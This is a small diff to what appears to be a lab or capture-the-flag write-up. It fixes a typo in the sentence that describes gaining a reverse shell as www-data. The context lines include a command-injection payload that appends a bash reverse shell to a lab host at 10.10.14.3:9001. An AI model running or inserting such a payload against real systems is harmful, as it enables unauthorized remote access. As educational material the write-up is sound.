@@ -108,7 +108,7 @@ Using the vulnerability to gain a reverse shell:
 delim=comma; bash -c 'bash -i >& /dev/tcp/10.10.14.3/9001 0>&1'
 ```
 
-After URL-encoding command and sending the request, the listener on my IP and port 9001 starts a reverse shell as the user _www-data_.
+After URL-encoding the command and sending the request, the listener on my IP and port 9001 starts a reverse shell as the user _www-data_.
 
 ## Privilege Escalation
 
